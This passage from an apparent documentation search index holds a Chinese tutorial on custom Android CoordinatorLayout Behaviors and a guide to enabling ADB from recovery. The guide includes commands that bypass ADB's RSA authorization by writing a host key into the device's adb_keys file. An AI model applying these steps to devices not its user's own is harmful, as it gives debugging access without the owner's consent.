version=\"1.0\" encoding=\"utf-8\"?> <android.support.design.widget.CoordinatorLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:fitsSystemWindows=\"true\" android:orientation=\"vertical\"> <android.support.v4.widget.NestedScrollView android:layout_gravity=\"left\" android:layout_width=\"wrap_content\" android:background=\"#FF00FF00\" android:layout_height=\"match_parent\"> <LinearLayout android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:orientation=\"vertical\"> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> </LinearLayout> </android.support.v4.widget.NestedScrollView> <android.support.v4.widget.NestedScrollView android:layout_gravity=\"right\" android:layout_width=\"wrap_content\" android:background=\"#FFFF0000\" android:layout_height=\"match_parent\" app:layout_behavior=\"org.loader.mybehavior.ScrollBehavior\"> <LinearLayout android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:orientation=\"vertical\"> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> </LinearLayout> </android.support.v4.widget.NestedScrollView> </android.support.design.widget.CoordinatorLayout> \u7b2c\u4e8c\u4e2aScrollView\u7684layout_behavior\u6211\u4eec\u6307\u5b9a\u4e3a org.loader.mybehavior.ScrollBehavior \uff0c\u73b0\u5728\u5c31\u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u6548\u679c\u4e86\u3002 ok\uff0c \u6700\u540e\u662f\u6587\u7ae0\u4e2ddemo\u7684\u4ee3\u7801\u4e0b\u8f7d\uff1a http://download.csdn.net/detail/qibin0506/9352989 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/qibin0506/article/details/50290421","title":"CoordinatorLayout\u9ad8\u7ea7\u7528\u6cd5 \u81ea\u5b9a\u4e49Behavior"},{"location":"Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/#coordinatorlayout-behavior","text":"\u5728\u65b0\u7684support design\u4e2d\uff0cCoordinatorLayout\u53ef\u4ee5\u8bf4\u662f\u6700\u91cd\u8981\u7684\u4e00\u4e2a\u63a7\u4ef6\u4e86\uff0cCoordinatorLayout\u7ed9\u6211\u4eec\u5e26\u6765\u4e86\u4e00\u79cd\u65b0\u7684\u4e8b\u4ef6\u7684\u5904\u7406\u65b9\u5f0f\u2014\u2014behavior\uff0c\u4f60\u662f\u4e0d\u662f\u8fd8\u8bb0\u5f97\u6211\u4eec\u5728\u4f7f\u7528CoordinatorLayout\u7684\u65f6\u5019\uff0c\u4e00\u4e9b\u5b50view\u9700\u8981\u4e00\u6bb5\uff0c app:layout_behavior=\"@string/appbar_scrolling_view_behavior\" \u8fd9\u6837\u7684xml\u914d\u7f6e\uff1f\u5f53\u65f6\u6211\u4eec\u4e0d\u77e5\u9053\u8fd9\u662f\u5e72\u561b\u7684\uff0c\u76f4\u63a5\u7167\u7528\u5c31\u884c\u4e86\uff0c\u540e\u6765\u53d1\u73b0\u8fd9\u73a9\u610f\u662f\u4e00\u4e2a\u7c7b\uff01\u800c\u4e14\u6211\u4eec\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\uff01\u6240\u4ee5\uff0c\u4eca\u5929\u8fd9\u7bc7\u535a\u5ba2\u6211\u4eec\u9996\u5148\u6765\u5b66\u4e60\u4e00\u4e0b\u5982\u4f55\u81ea\u5b9a\u4e49Behavior\uff0c\u4e4b\u540e\u7684\u535a\u5ba2\u53ef\u80fd\u4f1a\u770b\u4e00\u4e0bCoordinatorLayout\u662f\u600e\u4e48\u5904\u7406\u8fd9\u4e2aBehavior\u7684\u3002","title":"CoordinatorLayout\u9ad8\u7ea7\u7528\u6cd5-\u81ea\u5b9a\u4e49Behavior"},{"location":"Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/#behavior","text":"Behavior\u662fCoordinatorLayout\u7684\u4e00\u4e2a\u62bd\u8c61\u5185\u90e8\u7c7b public abstract static class Behavior<V extends View> { public Behavior() { } public Behavior(Context context, AttributeSet attrs) { } ... } \u6709\u4e00\u4e2a\u6cdb\u578b\u662f\u6307\u5b9a\u7684\u6211\u4eec\u5e94\u7528\u8fd9\u4e2aBehavior\u7684View\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\u4e0a\u9762\u7684appbar_scrolling_view_behavior\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5176\u5b9e\u662f android.support.design.widget.AppBarLayout$ScrollingViewBehavior ,\u8fd9\u4e2a ScrollingViewBehavior \u5185\u90e8\u7c7b\u6307\u5b9a\u7684\u6cdb\u578b\u662f View ,\u6240\u4ee5\u7406\u8bba\u4e0a\u8fd9\u4e2aBehavior\u6211\u4eec\u4efb\u4f55\u7684View\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u6211\u4eec\u5728\u81ea\u5b9a\u4e49\u7684\u65f6\u5019\uff0c\u5982\u679c\u4e0d\u662f\u7279\u6b8a\u7684\u884c\u4e3a\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u6cdb\u578b View \u3002 \u5728\u81ea\u5b9a\u4e49Behavior\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5173\u5fc3\u7684\u4e24\u7ec4\u56db\u4e2a\u65b9\u6cd5\uff0c\u4e3a\u4ec0\u4e48\u5206\u4e3a\u4e24\u7ec4\u5462\uff1f\u770b\u4e00\u4e0b\u4e0b\u9762\u4e24\u79cd\u60c5\u51b5 \u67d0\u4e2aview\u76d1\u542c\u53e6\u4e00\u4e2aview\u7684\u72b6\u6001\u53d8\u5316\uff0c\u4f8b\u5982\u5927\u5c0f\u3001\u4f4d\u7f6e\u3001\u663e\u793a\u72b6\u6001\u7b49 \u67d0\u4e2aview\u76d1\u542cCoordinatorLayout\u91cc\u7684\u6ed1\u52a8\u72b6\u6001 \u5bf9\u4e8e\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u5173\u5fc3\u7684\u662f\uff1a layoutDependsOn \u548c onDependentViewChanged \u65b9\u6cd5\uff0c \u5bf9\u4e8e\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u5173\u5fc3\u7684\u662f\uff1a onStartNestedScroll \u548c onNestedPreScroll \u65b9\u6cd5\u3002 \u5bf9\u4e8e\u8fd9\u51e0\u4e2a\u65b9\u6cd5\u4ec0\u4e48\u610f\u601d\uff0c\u6211\u4eec\u9700\u8981\u5e72\u4ec0\u4e48\uff0c\u7a0d\u5019\u6211\u4eec\u5c31\u80fd\u4e86\u89e3\u5230\u3002","title":"\u8ba4\u8bc6Behavior"},{"location":"Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/#_1","text":"\u73b0\u5728\u6211\u4eec\u5c31\u6765\u6839\u636e\u7b2c\u4e00\u79cd\u60c5\u51b5\u5c1d\u8bd5\u81ea\u5b9a\u4e49\u4e00\u4e2aBehavior\uff0c\u8fd9\u91cc\u6211\u4eec\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u6548\u679c\uff0c\u8ba9\u4e00\u4e2aView\u6839\u636e\u53e6\u4e00\u4e2aView\u4e0a\u4e0b\u79fb\u52a8\u3002 \u9996\u5148\u6211\u4eec\u6765\u81ea\u5b9a\u4e49\u4e00\u4e2aBehavior\uff0c\u8d77\u540d\u4e3a DependentBehavior public class DependentBehavior extends CoordinatorLayout.Behavior<View> { public DependentBehavior(Context context, AttributeSet attrs) { super(context, attrs); } @Override public boolean layoutDependsOn(CoordinatorLayout parent, View child, View dependency) { return super.layoutDependsOn(parent, child, dependency); } @Override public boolean onDependentViewChanged(CoordinatorLayout parent, View child, View dependency) { ViewCompat.offsetLeftAndRight(); return super.onDependentViewChanged(parent, child, dependency); } } \u6ce8\u610f\u4e00\u4e0b\uff0c\u5e26\u6709\u53c2\u6570\u7684\u8fd9\u4e2a\u6784\u9020\u5fc5\u987b\u8981\u91cd\u8f7d\uff0c\u56e0\u4e3a\u5728CoordinatorLayout\u91cc\u5229\u7528\u53cd\u5c04\u53bb\u83b7\u53d6\u8fd9\u4e2aBehavior\u7684\u65f6\u5019\u5c31\u662f\u62ff\u7684\u8fd9\u4e2a\u6784\u9020\u3002\u6211\u4eec\u8986\u5199\u4e86\u4e24\u4e2a\u65b9\u6cd5 layoutDependsOn \u548c onDependentViewChanged \uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7684\u53c2\u6570\u90fd\u662f\u4e00\u6837\u7684\uff0c\u89e3\u91ca\u4e00\u4e0b\uff0c\u7b2c\u4e00\u4e2a\u4e0d\u7528\u8bf4\uff0c\u5c31\u662f\u5f53\u524d\u7684CoordinatorLayout\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6211\u4eec\u8bbe\u7f6e\u8fd9\u4e2aBehavior\u7684View\uff0c\u7b2c\u4e09\u4e2a\u662f\u6211\u4eec\u5173\u5fc3\u7684\u90a3\u4e2aView\u3002\u5982\u4f55\u77e5\u9053\u5173\u5fc3\u7684\u54ea\u4e2a\u5462\uff1f layoutDependsOn \u7684\u8fd4\u56de\u503c\u51b3\u5b9a\u4e86\u4e00\u5207\uff01 \u8fd9\u91cc\u6211\u4eec\u5173\u5fc3\u4e00\u4e2aTextView\u597d\u4e86\uff0c\u6240\u4ee5 layoutDependsOn \u53ef\u4ee5\u8fd9\u4e48\u5199, @Override public boolean layoutDependsOn(CoordinatorLayout parent, View child, View dependency) { return dependency instanceof TextView; } \u73b0\u5728\u8bbe\u7f6e\u597d\u4e86\u5173\u5fc3\u8c01\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5728\u8fd9\u4e2aView\u72b6\u6001\u53d1\u751f\u53d8\u5316\u7684\u65f6\u5019\uff0c\u6211\u4eec\u73b0\u5728\u7684View\u8be5\u505a\u4e9b\u4ec0\u4e48\u4e86\uff0c\u6069\uff0c\u8fd9\u91cc\u80af\u5b9a\u662f\u5728 onDependentViewChanged \u505a\u5de5\u4f5c\u4e86\u3002\u6211\u4eec\u7684\u4efb\u52a1\u5c31\u662f\u83b7\u53d6dependency\u8ddd\u79bb\u5e95\u90e8\u7684\u8ddd\u79bb\uff0c\u5e76\u4e14\u8bbe\u7f6e\u7ed9child,\u5f88\u7b80\u5355\u3002 @Override public boolean onDependentViewChanged(CoordinatorLayout parent, View child, View dependency) { int offset = dependency.getTop() - child.getTop(); ViewCompat.offsetTopAndBottom(child, offset); return true; } \u9996\u5148\u6211\u4eec\u5148\u83b7\u53d6\u4e24\u4e2aView\u7684top\u503c\u7684\u5dee\uff0c\u7136\u540e\u8ba9child\u7684\u4f4d\u7f6e\u4f4d\u79fb\u4e00\u4e0b\u5c31ok\u5566\uff0c\u5982\u6b64\u7b80\u5355\uff0c\u90a3\u8fd9\u4e2a\u7b80\u5355\u7684Behavior\u5982\u4f55\u7528\u5462\uff1f <android.support.design.widget.CoordinatorLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:fitsSystemWindows=\"true\" tools:context=\"org.loader.mybehavior.MainActivity\"> <TextView android:id=\"@+id/depentent\" android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#FFFF0000\" android:gravity=\"center\" android:textColor=\"@android:color/white\" android:layout_gravity=\"top|left\" android:text=\"depentent\"/> <TextView android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#FF00FF00\" android:gravity=\"center\" android:textColor=\"@android:color/white\" android:layout_gravity=\"top|right\" app:layout_behavior=\"org.loader.mybehavior.DependentBehavior\" android:text=\"auto\"/> </android.support.design.widget.CoordinatorLayout> \u6ce8\u610f\uff0c\u7b2c\u4e8c\u4e2aTextView\u6211\u4eec\u8bbe\u7f6e\u4e86 app:layout_behavior=\"org.loader.mybehavior.DependentBehavior\" \u503c\u6b63\u597d\u662f\u6211\u4eec\u5b9a\u4e49\u7684\u90a3\u4e2a DependentBehavior \u3002 final TextView depentent = (TextView) findViewById(R.id.depentent); depentent.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { ViewCompat.offsetTopAndBottom(v, 5); } }); \u5728Activity\u4e2d\uff0c\u6211\u4eec\u6bcf\u6b21\u70b9\u51fb\u7b2c\u4e00\u4e2aTextView\u90fd\u4f1a\u53bb\u6539\u53d8\u4e00\u4e0b\u5b83\u7684\u4f4d\u7f6e\uff0c\u4e0b\u9762\u8ba9\u6211\u4eec\u6765\u770b\u770b\u53e6\u4e00\u4e2aTextView\u7684\u4f4d\u7f6e\u6539\u53d8\u4e86\u6ca1\u6709\u3002","title":"\u521d\u6b65\u81ea\u5b9a\u4e49"},{"location":"Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/#scroll-behavior","text":"\u5728\u5b66\u4f1a\u4e86\u5982\u4f55\u81ea\u5b9a\u4e49Behavior\u540e\uff0c\u6211\u4eec\u63a5\u7740\u6765\u5b9e\u73b0\u4e0a\u9762\u8bf4\u7684\u7b2c\u4e8c\u79cd\u60c5\u51b5-\u6ed1\u52a8\u3002\u4e3a\u4e86\u6f14\u793a\u8fd9\u79cdBehavior\u7684\u5b9a\u4e49\uff0c\u6211\u4eec\u8fd8\u662f\u6765\u505a\u4e2a\u65e0\u7528\u529f\uff0c\u8ba9\u4e00\u4e2aScrollView\u8ddf\u968f\u53e6\u4e00\u4e2aScrollView\u6ed1\u52a8\u3002\u6069\uff0c\u5148\u6765\u770b\u770b\u6548\u679c\u5427\uff0c \u4ece\u6548\u679c\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u7b2c\u4e8c\u4e2aScrollView\u660e\u663e\u662f\u662f\u5728\u8ddf\u968f\u7b2c\u4e00\u4e2a\u8fdb\u884c\u6ed1\u52a8\uff0c\u73b0\u5728\u5c31\u8ba9\u6211\u4eec\u7528\u81ea\u5b9a\u4e49Behavior\u7684\u5f62\u5f0f\u5b9e\u73b0\u5b83\u3002 \u521b\u5efa\u4e00\u4e2aBehavior\uff0c\u8d77\u540d\u53ebScrollBehavior\uff0c public class ScrollBehavior extends CoordinatorLayout.Behavior<View> { public ScrollBehavior(Context context, AttributeSet attrs) { super(context, attrs); } @Override public boolean onStartNestedScroll(CoordinatorLayout coordinatorLayout, View child, View directTargetChild, View target, int nestedScrollAxes) { return super.onStartNestedScroll(coordinatorLayout, child, directTargetChild, target, nestedScrollAxes); } @Override public void onNestedPreScroll(CoordinatorLayout coordinatorLayout, View child, View target, int dx, int dy, int[] consumed) { super.onNestedPreScroll(coordinatorLayout, child, target, dx, dy, consumed); } @Override public boolean onNestedPreFling(CoordinatorLayout coordinatorLayout, View child, View target, float velocityX, float velocityY) { return super.onNestedPreFling(coordinatorLayout, child, target, velocityX, velocityY); } } \u548c\u4f60\u60f3\u7684\u4e00\u6837\uff0c\u6211\u4eec\u8986\u5199\u4e86 onStartNestedScroll \u548c onNestedPreScroll \u65b9\u6cd5\uff0c\u4f46\u662f\u9664\u4e86\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u5916\uff0c\u6211\u4eec\u8fd8\u8986\u5199\u4e86 onNestedPreFling \u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u662f\u5e72\u561b\u7684\uff1f \u4f30\u8ba1\u5927\u5bb6\u5df2\u7ecf\u731c\u51fa\u6765\u4e86\uff0c\u8fd9\u91cc\u662f\u5904\u7406fling\u52a8\u4f5c\u7684\uff0c\u4f60\u60f3\u60f3\uff0c\u6211\u4eec\u5728\u6ed1\u52a8\u677e\u5f00\u624b\u7684\u65f6\u5019\uff0cScrollView\u662f\u4e0d\u662f\u8fd8\u7ee7\u7eed\u6ed1\u52a8\u4e00\u4f1a\uff0c\u90a3\u6211\u4eec\u4e5f\u9700\u8981\u8ba9\u8ddf\u968f\u7684\u90a3\u4e2aScrollView\u4e5f\u8981\u7ee7\u7eed\u6ed1\u52a8\u4e00\u4f1a\uff0c\u8fd9\u79cd\u6548\u679c\uff0c onNestedPreFling \u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\u3002 \u597d\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5b9e\u73b0\u4ee3\u7801\uff0c\u9996\u5148\u6765\u770b\u770b onStartNestedScroll \uff0c\u8fd9\u91cc\u7684\u8fd4\u56de\u503c\u8868\u660e\u8fd9\u6b21\u6ed1\u52a8\u6211\u4eec\u8981\u4e0d\u8981\u5173\u5fc3\uff0c\u6211\u4eec\u8981\u5173\u5fc3\u4ec0\u4e48\u6837\u7684\u6ed1\u52a8\uff1f\u5f53\u7136\u662fy\u8f74\u65b9\u5411\u4e0a\u7684\u3002 @Override public boolean onStartNestedScroll(CoordinatorLayout coordinatorLayout, View child, View directTargetChild, View target, int nestedScrollAxes) { return (nestedScrollAxes & ViewCompat.SCROLL_AXIS_VERTICAL) != 0; } \u73b0\u5728\u6211\u4eec\u51c6\u5907\u597d\u4e86\u5173\u5fc3\u7684\u6ed1\u52a8\u4e8b\u4ef6\u4e86\uff0c\u90a3\u5982\u4f55\u8ba9\u5b83\u6ed1\u52a8\u8d77\u6765\u5462\uff1f\u8fd8\u662f\u8981\u770b onNestedPreScroll \u7684\u5b9e\u73b0 @Override public void onNestedPreScroll(CoordinatorLayout coordinatorLayout, View child, View target, int dx, int dy, int[] consumed) { super.onNestedPreScroll(coordinatorLayout, child, target, dx, dy, consumed); int leftScrolled = target.getScrollY(); child.setScrollY(leftScrolled); } \u4e5f\u5f88\u7b80\u5355\uff0c\u8ba9child\u7684scrollY\u7684\u503c\u7b49\u4e8e\u76ee\u6807\u7684scrollY\u7684\u503c\u5c31ok\u5566\uff0c\u90a3fling\u5462\uff1f\u66f4\u7b80\u5355, @Override public boolean onNestedFling(CoordinatorLayout coordinatorLayout, View child, View target, float velocityX, float velocityY, boolean consumed) { ((NestedScrollView) child).fling((int)velocityY); return true; } \u76f4\u63a5\u5c06\u73b0\u5728\u7684y\u8f74\u4e0a\u7684\u901f\u5ea6\u4f20\u9012\u4f20\u9012\u7ed9child\uff0c\u8ba9\u4ed6fling\u8d77\u6765\u5c31ok\u4e86\u3002 \u5b9a\u4e49\u597d\u4e86Behavior\uff0c\u5c31\u5f97\u5728xml\u4e2d\u4f7f\u7528\u4e86\uff0c\u4f7f\u7528\u65b9\u6cd5\u548c\u524d\u9762\u7684\u4e00\u6837\u3002 <?xml version=\"1.0\" encoding=\"utf-8\"?> <android.support.design.widget.CoordinatorLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:fitsSystemWindows=\"true\" android:orientation=\"vertical\"> <android.support.v4.widget.NestedScrollView android:layout_gravity=\"left\" android:layout_width=\"wrap_content\" android:background=\"#FF00FF00\" android:layout_height=\"match_parent\"> <LinearLayout android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:orientation=\"vertical\"> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentLeft\"/> </LinearLayout> </android.support.v4.widget.NestedScrollView> <android.support.v4.widget.NestedScrollView android:layout_gravity=\"right\" android:layout_width=\"wrap_content\" android:background=\"#FFFF0000\" android:layout_height=\"match_parent\" app:layout_behavior=\"org.loader.mybehavior.ScrollBehavior\"> <LinearLayout android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:orientation=\"vertical\"> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:paddingTop=\"50dp\" android:paddingBottom=\"50dp\" android:textColor=\"@android:color/white\" android:text=\"contentRight\"/> </LinearLayout> </android.support.v4.widget.NestedScrollView> </android.support.design.widget.CoordinatorLayout> \u7b2c\u4e8c\u4e2aScrollView\u7684layout_behavior\u6211\u4eec\u6307\u5b9a\u4e3a org.loader.mybehavior.ScrollBehavior \uff0c\u73b0\u5728\u5c31\u53ef\u4ee5\u770b\u5230\u4e0a\u9762\u7684\u6548\u679c\u4e86\u3002 ok\uff0c \u6700\u540e\u662f\u6587\u7ae0\u4e2ddemo\u7684\u4ee3\u7801\u4e0b\u8f7d\uff1a http://download.csdn.net/detail/qibin0506/9352989 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/qibin0506/article/details/50290421","title":"Scroll Behavior"},{"location":"Android/Enable%20ADB%20from%20recovery/","text":"Android - Enable ADB from recovery Credits to @TheOnlyAnil-@Firelord ^stackoverflow Requirements: a) stock recovery + rooted phone b) custom recovery Files changed: /system/build.prop /data/property/persist.sys.usb.config /data/misc/adb/adb_keys Enable ADB (1/2): enable USB debugging same as \"Settings >> Developer Opcions >> USB debugging\" ON Connect the device to Mac or PC in recovery mode. Now open terminal/CMD in computer and go to platform-tools/. type and enter adb devices to check if the device is connected in recovery mode. Now type adb shell mount data and adb shell mount system to mount the respective directories. Get the persist.sys.usb.config file in your system using adb pull /data/property/persist.sys.usb.config /Your directory Now open that file in a texteditor and edit it to mtp,adb and save. Now push the file back in the device; adb push /your-directory/persist.sys.usb.config /data/property Get the build.prop file; adb pull /system/build.prop /your-directory Add these lines: persist.service.adb.enable=1 persist.service.debuggable=1 persist.sys.usb.config=mtp,adb Push build.prop back into the device; adb push /your-dir/build.prop /system/ Fast way adb shell mount data echo -n 'mtp,adb' > /data/property/persist.sys.usb.config Verify options are not present before do it: adb shell \"grep 'persist.service.adb.enable' /system/build.prop\" adb shell mount system echo '' >> /system/build.prop echo '# Enable ADB' >> /system/build.prop echo 'persist.service.adb.enable=1' >> /system/build.prop echo 'persist.service.debuggable=1' >> /system/build.prop echo 'persist.sys.usb.config=mtp,adb' >> /system/build.prop Enable ADB (2/2): RSA verification For the RSA verification that you asked to bypass, I don't know whether it would work in your device, but it worked in my little experiment. In Lollipop, the ADB keys (after authorization) are saved in /data/misc/adb/adb_keys . Your private key is saved in computer. In Linux the directory location is $HOME/.android/ . On Windows that usually translates to %USERPROFILE%\\.android , but keys might end up in C:\\Windows\\System32\\config\\systemprofile\\.android in some cases. adb push ~/.android/adbkey.pub /data/misc/adb/adb_keys Bibliography","title":"Enable ADB from recovery"},{"location":"Android/Enable%20ADB%20from%20recovery/#android-enable-adb-from-recovery","text":"Credits to @TheOnlyAnil-@Firelord ^stackoverflow Requirements: a) stock recovery + rooted phone b) custom recovery Files changed: /system/build.prop /data/property/persist.sys.usb.config /data/misc/adb/adb_keys","title":"Android - Enable ADB from recovery"},{"location":"Android/Enable%20ADB%20from%20recovery/#enable-adb-12-enable-usb-debugging","text":"same as \"Settings >> Developer Opcions >> USB debugging\" ON Connect the device to Mac or PC in recovery mode. Now open terminal/CMD in computer and go to platform-tools/. type and enter adb devices to check if the device is connected in recovery mode. Now type adb shell mount data and adb shell mount system to mount the respective directories. Get the persist.sys.usb.config file in your system using adb pull /data/property/persist.sys.usb.config /Your directory Now open that file in a texteditor and edit it to mtp,adb and save. Now push the file back in the device; adb push /your-directory/persist.sys.usb.config /data/property Get the build.prop file; adb pull /system/build.prop /your-directory Add these lines: persist.service.adb.enable=1 persist.service.debuggable=1 persist.sys.usb.config=mtp,adb Push build.prop back into the device; adb push /your-dir/build.prop /system/","title":"Enable ADB (1/2): enable USB debugging"},{"location":"Android/Enable%20ADB%20from%20recovery/#fast-way","text":"adb shell mount data echo -n 'mtp,adb' > /data/property/persist.sys.usb.config Verify options are not present before do it: adb shell \"grep 'persist.service.adb.enable' /system/build.prop\" adb shell mount system echo '' >> /system/build.prop echo '# Enable ADB' >> /system/build.prop echo 'persist.service.adb.enable=1' >> /system/build.prop echo 'persist.service.debuggable=1' >> /system/build.prop echo 'persist.sys.usb.config=mtp,adb' >> /system/build.prop","title":"Fast way"},{"location":"Android/Enable%20ADB%20from%20recovery/#enable-adb-22-rsa-verification","text":"For the RSA verification that you asked to bypass, I don't know whether it would work in your device, but it worked in my little experiment. In Lollipop, the ADB keys (after authorization) are saved in /data/misc/adb/adb_keys . Your private key is saved in computer. In Linux the directory location is $HOME/.android/ . On Windows that usually translates to %USERPROFILE%\\.android , but keys might end up in C:\\Windows\\System32\\config\\systemprofile\\.android in some cases. adb push ~/.android/adbkey.pub /data/misc/adb/adb_keys","title":"Enable ADB (2/2): RSA verification"},{"location":"Android/Enable%20ADB%20from%20recovery/#bibliography","text":"","title":"Bibliography"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/","text":"Mobile Application Penetration Testing Cheat sheet with Tools & Resources for Security Professionals The Mobile Apps Pentesting cheat sheet was created to provide a collection of high-value information on specific mobile application penetration testing topics and checklist, which is mapped OWASP Mobile Risk Top 10 for conducting Penetration testing. Here you can find the most important Android Application Penetration Testing course to enhance more skill in this area. Mobile Application Security Testing Distributions Appie \u2013 A portable software package for Android Pentesting and an awesome alternative to existing Virtual machines. Android Tamer \u2013 Android Tamer is a Virtual / Live Platform for Android Security professionals. AppUse \u2013 AppUse is a VM (Virtual Machine) developed by AppSec Labs. Androl4b \u2013 A Virtual Machine For Assessing Android applications, Reverse Engineering 